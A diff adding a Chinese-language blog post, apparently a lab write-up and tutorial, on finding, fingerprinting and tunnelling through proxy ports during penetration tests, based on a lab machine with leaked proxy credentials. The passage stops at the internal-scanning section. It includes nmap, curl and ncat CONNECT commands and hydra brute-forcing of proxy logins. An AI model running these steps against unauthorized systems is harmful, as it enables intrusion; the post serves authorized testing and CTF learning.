@@ -1,0 +1,1147 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="渗透测试中的代理：从识别、探测到内网穿透的完整实战指南 起源于一次真实靶机（Gost, 192.168.56.122）的渗透：一个泄露了凭据的 gost 代理端口，最终成为打进内网、隧穿到只监听 127.0.0.1 的 SSH、并拿下 root 的关键跳板。 本文以此为引子，系统梳理渗透测试中遇到各种代理端口 &#x2F; 代理软件时的应对方法：如何识别、如何与之”对话”、如何借它探测内网、如何让">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶机时遇到的代理端口及应对方法">
+<meta property="og:url" content="http://example.com/2026/06/11/%E6%89%93%E9%9D%B6%E6%9C%BA%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E4%BB%A3%E7%90%86%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="渗透测试中的代理：从识别、探测到内网穿透的完整实战指南 起源于一次真实靶机（Gost, 192.168.56.122）的渗透：一个泄露了凭据的 gost 代理端口，最终成为打进内网、隧穿到只监听 127.0.0.1 的 SSH、并拿下 root 的关键跳板。 本文以此为引子，系统梳理渗透测试中遇到各种代理端口 &#x2F; 代理软件时的应对方法：如何识别、如何与之”对话”、如何借它探测内网、如何让">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-06-11T14:08:05.000Z">
+<meta property="article:modified_time" content="2026-06-11T14:09:01.980Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>打靶机时遇到的代理端口及应对方法 - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="打靶机时遇到的代理端口及应对方法"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-06-11 22:08" pubdate>
+          June 11, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">打靶机时遇到的代理端口及应对方法</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="渗透测试中的代理：从识别、探测到内网穿透的完整实战指南"><a href="#渗透测试中的代理：从识别、探测到内网穿透的完整实战指南" class="headerlink" title="渗透测试中的代理：从识别、探测到内网穿透的完整实战指南"></a>渗透测试中的代理：从识别、探测到内网穿透的完整实战指南</h1><blockquote>
+<p>起源于一次真实靶机（Gost, <code>192.168.56.122</code>）的渗透：一个泄露了凭据的 <code>gost</code> 代理端口，最终成为打进内网、隧穿到只监听 <code>127.0.0.1</code> 的 SSH、并拿下 root 的关键跳板。</p>
+<p>本文以此为引子，系统梳理渗透测试中遇到<strong>各种代理端口 &#x2F; 代理软件</strong>时的应对方法：如何识别、如何与之”对话”、如何借它探测内网、如何让 SSH 穿过它，以及如何把一个代理升级成完整的内网隧道。</p>
+<p>目标读者：做授权渗透测试 &#x2F; 红队 &#x2F; CTF 的同学。所有技术仅用于合法授权场景。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#1-%E4%BB%8E-gost-%E6%A1%88%E4%BE%8B%E8%AF%B4%E8%B5%B7">从 Gost 案例说起：代理为什么是渗透的黄金资产</a></li>
+<li><a href="#2-%E4%BB%A3%E7%90%86%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A8%A1%E5%9E%8B">代理的基础模型：正向、反向、协议</a></li>
+<li><a href="#3-%E8%AF%86%E5%88%AB%E4%BB%A3%E7%90%86">识别代理：端口、指纹、常见软件</a></li>
+<li><a href="#4-%E4%B8%8E%E4%BB%A3%E7%90%86%E5%AF%B9%E8%AF%9D">与代理”对话”：HTTP CONNECT 与 SOCKS 协议拆解</a></li>
+<li><a href="#5-%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91">通过代理探测内网：命令与工具大全</a></li>
+<li><a href="#6-ssh-%E7%A9%BF%E8%BF%87%E4%BB%A3%E7%90%86%E7%9A%84-n-%E7%A7%8D%E5%A7%BF%E5%8A%BF">SSH 穿过代理的 N 种姿势</a></li>
+<li><a href="#7-%E4%BB%8E%E5%8D%95%E7%82%B9%E4%BB%A3%E7%90%86%E5%88%B0%E5%AE%8C%E6%95%B4%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93">从单点代理到完整内网隧道：Pivoting</a></li>
+<li><a href="#8-%E6%8C%89%E8%BD%AF%E4%BB%B6%E5%88%86%E7%B1%BB%E7%9A%84%E5%AE%9E%E6%88%98%E5%BA%94%E5%AF%B9%E6%89%8B%E5%86%8C">按软件分类的实战应对手册</a></li>
+<li><a href="#9-%E5%B8%B8%E8%A7%81%E8%BF%94%E5%9B%9E%E7%A0%81%E6%8A%A5%E9%94%99%E4%B8%8E%E6%8E%92%E6%9F%A5">常见返回码、报错与排查</a></li>
+<li><a href="#10-%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%A3%80%E6%B5%8B%E8%A7%86%E8%A7%92">代理利用的防御与检测视角</a></li>
+<li><a href="#11-%E9%80%9F%E6%9F%A5%E8%A1%A8">速查表（Cheat Sheet）</a></li>
+</ol>
+<hr>
+<h2 id="1-从-Gost-案例说起"><a href="#1-从-Gost-案例说起" class="headerlink" title="1. 从 Gost 案例说起"></a>1. 从 Gost 案例说起</h2><p>在 Gost 靶机里，攻击链的”七寸”就是那个代理端口。回顾一下：</p>
+<ul>
+<li><code>nmap</code> 扫到 <code>1680/tcp</code> 返回 <code>Proxy-Authenticate: Basic realm=&quot;gost&quot;</code> —— 一个需要认证的代理。</li>
+<li>Web 端泄露了配置，拿到代理凭据 <code>root:123</code>，并得知它是 <code>auto</code> 模式（自动识别 HTTP&#x2F;SOCKS5）。</li>
+<li>用这个代理做 <strong>HTTP CONNECT 隧道</strong>，扫描目标的 <code>127.0.0.1</code>，发现 <strong>SSH 只监听本地的 22 端口</strong>（外部 nmap 根本看不到）。</li>
+<li>让 <code>ssh</code> 通过 <code>ncat</code> 走代理连进去，拿到初始 shell。</li>
+</ul>
+<p>这说明了代理在渗透中的三重价值：</p>
+<table>
+<thead>
+<tr>
+<th>价值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>暴露面扩展</strong></td>
+<td>代理能访问”它自己看得到”的网络——通常包括 <code>127.0.0.1</code> 和内网网段，这些都是外部扫不到的</td>
+</tr>
+<tr>
+<td><strong>跳板 &#x2F; Pivot</strong></td>
+<td>拿下一个代理 &#x3D; 拿到一张进入内网的”门票”，后续所有流量可经它转发</td>
+</tr>
+<tr>
+<td><strong>凭据复用线索</strong></td>
+<td>代理凭据常和系统账户复用（如本例 <code>root:123</code> 同时是 SSH 口令）</td>
+</tr>
+</tbody></table>
+<p>记住一句话：<strong>渗透中看到任何代理端口，都要问三件事——它认证吗？它能到哪？我能让什么流量穿过它？</strong></p>
+<hr>
+<h2 id="2-代理的基础模型"><a href="#2-代理的基础模型" class="headerlink" title="2. 代理的基础模型"></a>2. 代理的基础模型</h2><p>要灵活应对代理，先把概念理清。代理本质是”替你转发流量的中间人”，主要从三个维度区分。</p>
+<h3 id="2-1-正向代理-vs-反向代理"><a href="#2-1-正向代理-vs-反向代理" class="headerlink" title="2.1 正向代理 vs 反向代理"></a>2.1 正向代理 vs 反向代理</h3><ul>
+<li><strong>正向代理 (Forward Proxy)</strong>：客户端主动配置使用的代理，代理”代表客户端”去访问目标。渗透中遇到的可控代理（gost、squid、SOCKS）大多是这类——你把它当跳板。</li>
+<li><strong>反向代理 (Reverse Proxy)</strong>：部署在服务端前面，”代表服务器”接收请求（nginx、HAProxy、Traefik）。渗透中它更多是攻击面（SSRF、路由绕过、Host 头注入、内部服务暴露）。</li>
+</ul>
+<blockquote>
+<p>经验：开放在非标准端口、需要 CONNECT&#x2F;SOCKS 握手的，多半是正向代理跳板；监听 80&#x2F;443 且后面挂着 web 应用的，多半是反向代理。</p>
+</blockquote>
+<h3 id="2-2-按协议分类"><a href="#2-2-按协议分类" class="headerlink" title="2.2 按协议分类"></a>2.2 按协议分类</h3><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>默认端口（常见）</th>
+<th>特征</th>
+<th>能转发什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HTTP 代理</strong></td>
+<td>3128, 8080, 8000, 808x</td>
+<td>明文 HTTP 头，<code>GET http://...</code></td>
+<td>仅 HTTP</td>
+</tr>
+<tr>
+<td><strong>HTTP CONNECT</strong></td>
+<td>同上 &#x2F; 任意</td>
+<td><code>CONNECT host:port</code> 建立隧道</td>
+<td><strong>任意 TCP</strong>（含 HTTPS、SSH、RDP…）</td>
+</tr>
+<tr>
+<td><strong>SOCKS4 &#x2F; 4a</strong></td>
+<td>1080</td>
+<td>二进制握手，4a 支持域名</td>
+<td>任意 TCP</td>
+</tr>
+<tr>
+<td><strong>SOCKS5</strong></td>
+<td>1080, 1081, 9050(Tor)</td>
+<td>二进制握手，支持 UDP、认证、域名</td>
+<td>任意 TCP + UDP</td>
+</tr>
+<tr>
+<td><strong>多协议&#x2F;auto</strong></td>
+<td>任意（gost 1080&#x2F;8080…）</td>
+<td>同端口自动识别 HTTP&#x2F;SOCKS</td>
+<td>看实现</td>
+</tr>
+</tbody></table>
+<p>关键区别：<strong>普通 HTTP 代理只能转发 HTTP</strong>，但 <strong>HTTP CONNECT 能隧穿任意 TCP</strong>——这正是 Gost 案例里 SSH 能穿过去的原因。SOCKS5 最强（任意 TCP + UDP + 域名解析）。</p>
+<h3 id="2-3-认证方式"><a href="#2-3-认证方式" class="headerlink" title="2.3 认证方式"></a>2.3 认证方式</h3><ul>
+<li><strong>无认证</strong>：直接用，最理想。</li>
+<li><strong>HTTP Basic</strong>（<code>Proxy-Authenticate: Basic realm=...</code>）：用户名密码 base64，常被泄露或弱口令。</li>
+<li><strong>SOCKS5 用户名&#x2F;密码认证</strong>（RFC 1929）。</li>
+<li><strong>NTLM &#x2F; Negotiate</strong>（企业环境 squid&#x2F;ISA&#x2F;Forefront）：需要域凭据。</li>
+</ul>
+<p>Gost 案例返回的 <code>Proxy-Authenticate: Basic realm=&quot;gost&quot;</code> 就是 HTTP Basic，凭据 <code>root:123</code> 是从配置文件泄露拿到的。</p>
+<h3 id="2-4-代理软件-隧道软件"><a href="#2-4-代理软件-隧道软件" class="headerlink" title="2.4 代理软件 !&#x3D; 隧道软件"></a>2.4 代理软件 !&#x3D; 隧道软件</h3><p>还有一类不是”标准代理协议”，而是<strong>专用内网穿透&#x2F;隧道工具</strong>，渗透中既可能是目标遗留的，也可能是你自己上传的：</p>
+<ul>
+<li><strong>轻量内网穿透</strong>：<code>gost</code>、<code>frp</code>、<code>chisel</code>、<code>ngrok</code>、<code>ligolo-ng</code>、<code>rpivot</code>、<code>reGeorg/Neo-reGeorg</code>（webshell 隧道）</li>
+<li><strong>C2 内置代理</strong>：Metasploit <code>route</code> + <code>socks_proxy</code>、Cobalt Strike SOCKS、sliver</li>
+<li><strong>SSH 自带</strong>：<code>-D</code>（动态 SOCKS）、<code>-L/-R</code>（端口转发）</li>
+</ul>
+<p>这些会在第 7、8 节展开。</p>
+<hr>
+<h2 id="3-识别代理"><a href="#3-识别代理" class="headerlink" title="3. 识别代理"></a>3. 识别代理</h2><p>发现一个开放端口后，第一步是判断”它是不是代理、是哪种代理”。</p>
+<h3 id="3-1-nmap-指纹"><a href="#3-1-nmap-指纹" class="headerlink" title="3.1 nmap 指纹"></a>3.1 nmap 指纹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 版本探测 + 默认脚本</span><br>nmap -sV -sC -p &lt;port&gt; &lt;target&gt;<br><br><span class="hljs-comment"># 针对代理的脚本</span><br>nmap --script socks-open-proxy -p 1080 &lt;target&gt;<br>nmap --script http-open-proxy -p 8080,3128 &lt;target&gt;<br></code></pre></td></tr></table></figure>
+
+<p>典型指纹片段（来自 Gost 案例）：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">1680</span><span class="hljs-symbol">/tcp</span> open  http-proxy (proxy authentication required)<br>|     HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">407</span> Proxy Authentication Required<br>|_    <span class="hljs-params">Proxy-Authenticate:</span> Basic realm<span class="hljs-operator">=</span><span class="hljs-string">&quot;gost&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>407 Proxy Authentication Required</code> → <strong>这是 HTTP 代理</strong>，且需要认证。</li>
+<li><code>realm=&quot;gost&quot;</code> → 直接暴露了软件名（gost）。</li>
+<li>nmap 还提示 “soft-matched socks5” → 说明同端口也响应 SOCKS5（auto 模式）。</li>
+</ul>
+<h3 id="3-2-手工-banner-行为探测"><a href="#3-2-手工-banner-行为探测" class="headerlink" title="3.2 手工 banner &#x2F; 行为探测"></a>3.2 手工 banner &#x2F; 行为探测</h3><p><strong>测 HTTP 代理</strong>（看是否返回 407 或能否 CONNECT）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接当 HTTP 代理用</span><br>curl -v -x http://&lt;target&gt;:&lt;port&gt; http://example.com/<br><br><span class="hljs-comment"># 测 CONNECT 能力</span><br>curl -v -x http://&lt;target&gt;:&lt;port&gt; https://example.com/<br></code></pre></td></tr></table></figure>
+
+<p><strong>测 SOCKS</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v --socks5 &lt;target&gt;:&lt;port&gt; http://example.com/<br>curl -v --socks4 &lt;target&gt;:&lt;port&gt; http://example.com/<br><span class="hljs-comment"># SOCKS5 + 远端 DNS 解析</span><br>curl -v --socks5-hostname &lt;target&gt;:&lt;port&gt; http://example.com/<br></code></pre></td></tr></table></figure>
+
+<p><strong>测 auto &#x2F; 多协议</strong>：分别用 HTTP、SOCKS4、SOCKS5 各打一次，看哪个握手成功。Gost 这种 <code>auto</code> 会全都能用。</p>
+<h3 id="3-3-常见端口-→-软件的经验映射"><a href="#3-3-常见端口-→-软件的经验映射" class="headerlink" title="3.3 常见端口 → 软件的经验映射"></a>3.3 常见端口 → 软件的经验映射</h3><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>可能的软件&#x2F;用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3128</td>
+<td>Squid（经典 HTTP 代理）</td>
+</tr>
+<tr>
+<td>8080 &#x2F; 8000 &#x2F; 8888</td>
+<td>通用 HTTP 代理 &#x2F; 应用代理 &#x2F; Burp</td>
+</tr>
+<tr>
+<td>1080 &#x2F; 1081</td>
+<td>SOCKS（Dante、ss、各种）</td>
+</tr>
+<tr>
+<td>9050 &#x2F; 9150</td>
+<td>Tor SOCKS</td>
+</tr>
+<tr>
+<td>7890 &#x2F; 7891</td>
+<td>Clash</td>
+</tr>
+<tr>
+<td>1087 &#x2F; 8889</td>
+<td>各类客户端默认</td>
+</tr>
+<tr>
+<td>4145</td>
+<td>SOCKS4（老）</td>
+</tr>
+<tr>
+<td>任意高位</td>
+<td>gost &#x2F; frp &#x2F; chisel &#x2F; ligolo 等隧道工具</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>注意：端口只是线索，<strong>一切以实际握手为准</strong>。攻击者部署的隧道工具常用随机高位端口。</p>
+</blockquote>
+<h3 id="3-4-从配置-进程确认（已有立足点时）"><a href="#3-4-从配置-进程确认（已有立足点时）" class="headerlink" title="3.4 从配置 &#x2F; 进程确认（已有立足点时）"></a>3.4 从配置 &#x2F; 进程确认（已有立足点时）</h3><p>拿到 shell 后，确认代理软件最直接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep -iE <span class="hljs-string">&#x27;gost|frp|chisel|squid|danted|3proxy|ngrok|ligolo|socks&#x27;</span><br>netstat -tlnp 2&gt;/dev/null || ss -tlnp<br><span class="hljs-built_in">cat</span> /etc/squid/squid.conf 2&gt;/dev/null<br><span class="hljs-built_in">ls</span> -la /etc/frp* /etc/gost* 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>Gost 案例正是从 <code>/admin/config</code>（web 泄露）+ 进程列表 <code>gost -L root:123@:1680 -api 127.0.0.1:53000</code> 完整还原了代理配置。</p>
+<hr>
+<h2 id="4-与代理”对话”"><a href="#4-与代理”对话”" class="headerlink" title="4. 与代理”对话”"></a>4. 与代理”对话”</h2><p>理解底层协议能让你在工具失灵时手工操作，也能更好地排错。</p>
+<h3 id="4-1-HTTP-代理（转发模式）"><a href="#4-1-HTTP-代理（转发模式）" class="headerlink" title="4.1 HTTP 代理（转发模式）"></a>4.1 HTTP 代理（转发模式）</h3><p>客户端把<strong>完整 URL</strong>放进请求行，代理替你去取：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">http://internal-site/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>internal-site<br><span class="hljs-attribute">Proxy-Authorization</span><span class="hljs-punctuation">: </span>Basic cm9vdDoxMjM=     ← base64(&quot;root:123&quot;)<br><br></code></pre></td></tr></table></figure>
+
+<p>手工演示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;GET http://127.0.0.1:8000/ HTTP/1.1\r\nHost: 127.0.0.1\r\nProxy-Authorization: Basic %s\r\n\r\n&#x27;</span> \<br>  <span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;root:123&#x27; | base64)</span>&quot;</span> | ncat &lt;target&gt; &lt;port&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-2-HTTP-CONNECT（隧道模式）——-重点"><a href="#4-2-HTTP-CONNECT（隧道模式）——-重点" class="headerlink" title="4.2 HTTP CONNECT（隧道模式）—— 重点"></a>4.2 HTTP CONNECT（隧道模式）—— 重点</h3><p>CONNECT 让代理建立一条到 <code>host:port</code> 的<strong>裸 TCP 隧道</strong>，之后双方流量原样转发。这就是为什么能隧穿 SSH&#x2F;RDP&#x2F;HTTPS：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">CONNECT</span> <span class="hljs-string">127.0.0.1:22</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:22<br><span class="hljs-attribute">Proxy-Authorization</span><span class="hljs-punctuation">: </span>Basic cm9vdDoxMjM=<br><br></code></pre></td></tr></table></figure>
+
+<p>代理回 <code>HTTP/1.1 200 Connection established</code> 后，这条 TCP 通道就”透明”了，你直接在上面跑 SSH 协议即可。<code>ncat --proxy ... --proxy-type http</code> 帮你完成这一握手（见第 6 节）。</p>
+<p>手工验证 CONNECT 是否可达内网某端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;CONNECT 127.0.0.1:22 HTTP/1.1\r\nHost: x\r\nProxy-Authorization: Basic %s\r\n\r\n&#x27;</span> \<br>  <span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;root:123&#x27; | base64)</span>&quot;</span> | ncat &lt;target&gt; 1680<br><span class="hljs-comment"># 返回 &quot;200 Connection established&quot; 后会接着出现 SSH-2.0-... banner</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-3-SOCKS5-握手（简述）"><a href="#4-3-SOCKS5-握手（简述）" class="headerlink" title="4.3 SOCKS5 握手（简述）"></a>4.3 SOCKS5 握手（简述）</h3><p>SOCKS5 是二进制协议，流程：</p>
+<ol>
+<li>客户端发 <code>05 | nmethods | methods</code>（方法：<code>00</code> 无认证 &#x2F; <code>02</code> 用户名密码）。</li>
+<li>服务端选一个方法。</li>
+<li>（若需要）用户名密码认证（RFC 1929）。</li>
+<li>客户端发 <code>CONNECT</code> 请求：<code>05 01 00 &lt;addrtype&gt; &lt;addr&gt; &lt;port&gt;</code>。</li>
+<li>建立连接，开始转发。</li>
+</ol>
+<p>手工拼 SOCKS5 包很繁琐，实战直接用工具（curl <code>--socks5</code>、proxychains、<code>ncat --proxy-type socks5</code>）。</p>
+<h3 id="4-4-暴破-猜测代理凭据"><a href="#4-4-暴破-猜测代理凭据" class="headerlink" title="4.4 暴破&#x2F;猜测代理凭据"></a>4.4 暴破&#x2F;猜测代理凭据</h3><p>代理认证也能爆破（注意授权与速率）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># hydra 打 HTTP 代理</span><br>hydra -L users.txt -P pass.txt http-proxy://&lt;target&gt;:&lt;port&gt;<br><br><span class="hljs-comment"># 或用 ncat/脚本循环 CONNECT，看 200 vs 407</span><br></code></pre></td></tr></table></figure>
+
+<p>但优先找<strong>凭据泄露</strong>（配置文件、环境变量、Web 信息泄露）——像 Gost 案例那样，比爆破高效得多。</p>
+<hr>
+<h2 id="5-通过代理探测内网"><a href="#5-通过代理探测内网" class="headerlink" title="5. 通过代理探测内网"></a>5. 通过代理探测内网</h2><p>拿到可用代理后，最有价值的动作是：<strong>用它扫描它能到达、而你直接到不了的网络</strong>——尤其是 <code>127.0.0.1</code> 和内网网段。</p>
